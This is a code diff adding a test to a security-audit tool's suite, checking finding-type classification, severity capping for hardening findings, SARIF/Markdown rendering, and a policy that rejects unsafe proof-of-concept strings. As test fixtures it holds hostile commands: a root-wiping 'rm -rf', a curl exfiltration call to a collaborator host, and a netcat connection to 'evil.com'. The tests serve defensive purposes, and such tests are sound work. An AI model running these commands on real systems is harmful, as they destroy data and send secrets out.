@@ -51,7 +51,11 @@ import {
   validateDiscoveryMatrix,
   computeLineageFingerprint,
   VALID_NOVELTY_STATES,
-  validateFindingLineage
+  validateFindingLineage,
+  VALID_FINDING_TYPES,
+  validateFindingType,
+  VALID_PROOF_KINDS,
+  validateSafeProof
 } from './finalize-scan.mjs';
 
 
@@ -2968,7 +2972,113 @@ export function runTests() {
 
   console.log('✔ 71. R2-P0-09 / 10 Invariant: Multi-Profile Threat Model & Granular Coverage Classification.');
 
-  console.log('\nAll render-sarif.mjs automated verification tests passed successfully (71/71).');
+  // 72. R2-P0-11 / R2-P0-12 Invariant: Finding Type & Safe Proof Policy
+  // 72.1 validateFindingType validates types and infers hardening/informational without misclassifying information disclosure
+  const ftVuln = validateFindingType('VULNERABILITY');
+  const ftHard = validateFindingType(null, 'CWE-hardening', 'Stricter CSP header');
+  const ftInfo = validateFindingType('informational');
+  const ftDefault = validateFindingType('UNKNOWN_GARBAGE');
+  const ftInfoDisclosure = validateFindingType(null, 'CWE-200', 'Sensitive Information Disclosure in API');
+  if (ftVuln.findingType !== 'VULNERABILITY' ||
+      ftHard.findingType !== 'HARDENING' ||
+      ftInfo.findingType !== 'INFORMATIONAL' ||
+      ftDefault.findingType !== 'VULNERABILITY' ||
+      ftInfoDisclosure.findingType !== 'VULNERABILITY') {
+    throw new Error('R2-P0-11 VIOLATION: validateFindingType returned incorrect categories or misclassified information disclosure');
+  }
+
+  // 72.2 Hardening cannot be elevated to CRITICAL/HIGH vulnerability
+  const hardeningCandidate = {
+    id: 'SEC-HARD-01',
+    ruleId: 'SEC-DEFENSE-IN-DEPTH',
+    title: 'Proactive Rate Limiting Improvement',
+    description: 'Improve rate limiting',
+    findingType: 'HARDENING',
+    severity: 'CRITICAL',
+    location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 }
+  };
+  const validatedHardening = validateCanonicalFindings([hardeningCandidate], process.cwd());
+  if (validatedHardening[0].severity !== 'LOW') {
+    throw new Error(`R2-P0-11 VIOLATION: Hardening finding elevated to CRITICAL/HIGH was not capped to LOW: got ${validatedHardening[0].severity}`);
+  }
+
+  // 72.3 validateSafeProof allows safe proof kinds and strictly blocks destructive / exfil / netcat / live exploit patterns (R2-P0-12)
+  const safeStaticProof = validateSafeProof('Source sink flow in controller.js', 'STATIC_TRACE');
+  const safePocProof = validateSafeProof('echo BENIGN_AUDIT_TOKEN', 'BENIGN_REPRODUCTION');
+  const prohibitedExploitProof = validateSafeProof('LIVE_EXPLOIT against live production server', 'STATIC_TRACE');
+  const prohibitedDestructiveProof = validateSafeProof('rm -rf / --no-preserve-root', 'UNIT_TEST');
+  const prohibitedExfilProof = validateSafeProof('curl https://burpcollaborator.net/exfil?token=123', 'STATIC_TRACE');
+  const prohibitedNetcatProof = validateSafeProof('nc evil.com 4444', 'STATIC_TRACE');
+
+  if (!safeStaticProof.valid || !safePocProof.valid) {
+    throw new Error('R2-P0-12 VIOLATION: Legitimate safe proof was rejected');
+  }
+  if (prohibitedExploitProof.valid || prohibitedDestructiveProof.valid || prohibitedExfilProof.valid || prohibitedNetcatProof.valid) {
+    throw new Error('R2-P0-12 VIOLATION: Prohibited proof pattern (live exploit, destructive command, exfil, or netcat) was not blocked fail-closed');
+  }
+
+  // 72.4 Prohibited proof in attackPath (short-circuit bypass attempt) causes canonical finding to downgrade to DEFERRED fail-closed
+  const maliciousPocCandidate = {
+    id: 'SEC-BAD-POC',
+    ruleId: 'CWE-78',
+    title: 'Command Injection with Destructive PoC in attackPath',
+    description: 'Benign proof header but malicious attackPath',
+    proof: 'benign source-to-sink static dataflow trace',
+    attackPath: { steps: [], proofOfConcept: 'rm -rf / --no-preserve-root' },
+    location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 },
+    disposition: 'REPORTABLE',
+    verdict: 'CONFIRMED',
+    consensus: { supports: 3, totalVotes: 3 },
+    rigor: { score: 0.9 }
+  };
+  const validatedMalicious = validateCanonicalFindings([maliciousPocCandidate], process.cwd());
+  if (validatedMalicious[0].disposition !== 'DEFERRED' || !validatedMalicious[0].dispositionReason.includes('PROHIBITED_PROOF_VIOLATION')) {
+    throw new Error(`R2-P0-12 VIOLATION: Candidate with destructive proof in attackPath was not downgraded to DEFERRED: ${JSON.stringify(validatedMalicious[0])}`);
+  }
+
+  // 72.5 SARIF and Markdown renderers preserve findingType and proofKind with canDeclareClean parity
+  const sampleFindings = [
+    {
+      id: 'SEC-VULN-01',
+      ruleId: 'CWE-89',
+      title: 'SQL Injection in Auth',
+      description: 'Concatenation of user input',
+      findingType: 'VULNERABILITY',
+      proofKind: 'STATIC_TRACE',
+      severity: 'HIGH',
+      location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 },
+      disposition: 'DEFERRED'
+    },
+    {
+      id: 'SEC-HARD-02',
+      ruleId: 'SEC-CSP',
+      title: 'Missing Content-Security-Policy',
+      description: 'Consider adding CSP',
+      findingType: 'HARDENING',
+      proofKind: 'CONFIG_EVIDENCE',
+      severity: 'LOW',
+      location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 },
+      disposition: 'REPORTABLE',
+      consensus: { supports: 3, totalVotes: 3 },
+      rigor: { score: 0.9 }
+    }
+  ];
+  const renderedSampleSarif = renderSarifFromCanonical({ canonicalFindings: sampleFindings, repoRoot: process.cwd() });
+  const renderedSampleMd = renderMarkdownFromCanonical({ canonicalFindings: sampleFindings, repoRoot: process.cwd() });
+
+  const sarifRes0 = renderedSampleSarif.runs[0].results[0];
+  const sarifRes1 = renderedSampleSarif.runs[0].results[1];
+  if (sarifRes0.properties.findingType !== 'VULNERABILITY' || sarifRes0.properties.proofKind !== 'STATIC_TRACE' ||
+      sarifRes1.properties.findingType !== 'HARDENING' || sarifRes1.properties.proofKind !== 'CONFIG_EVIDENCE') {
+    throw new Error('R2-P0-11/12 VIOLATION: SARIF output failed to preserve findingType or proofKind properties');
+  }
+  if (!renderedSampleMd.includes('Finding Type') || !renderedSampleMd.includes('Safe Proof Kind') || !renderedSampleMd.includes('Advisory Hardening Opportunities')) {
+    throw new Error('R2-P0-11/12 VIOLATION: Markdown report failed to present findingType or distinct hardening section');
+  }
+
+  console.log('✔ 72. R2-P0-11 / 12 Invariant: Finding Type & Safe Defensive Proof Policy.');
+
+  console.log('\nAll render-sarif.mjs automated verification tests passed successfully (72/72).');
 
   } finally {
     gitFixture.cleanup();
